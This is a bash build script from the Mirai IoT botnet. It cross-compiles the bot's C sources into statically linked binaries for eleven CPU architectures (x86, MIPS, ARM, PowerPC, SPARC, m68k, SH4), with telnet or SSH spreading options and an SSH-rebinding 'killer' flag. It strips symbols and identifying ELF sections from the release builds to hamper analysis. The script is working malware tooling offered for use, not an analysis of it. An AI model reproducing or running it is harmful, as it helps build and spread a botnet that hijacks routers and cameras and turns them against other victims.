#!/bin/bash

FLAGS=""

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release/mirai.*
    rm release/miraint.*
    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

    compile_bot i586 miraint.x86 "-static"
    compile_bot mips miraint.mips "-static"
    compile_bot mipsel miraint.mpsl "-static"
    compile_bot armv4l miraint.arm "-static"
    compile_bot armv5l miraint.arm5n " "
    compile_bot armv6l miraint.arm7 "-static"
    compile_bot powerpc miraint.ppc "-static"
    compile_bot sparc miraint.spc "-static"
    compile_bot m68k miraint.m68k "-static"
    compile_bot sh4 miraint.sh4 "-static"
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -fcommon -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
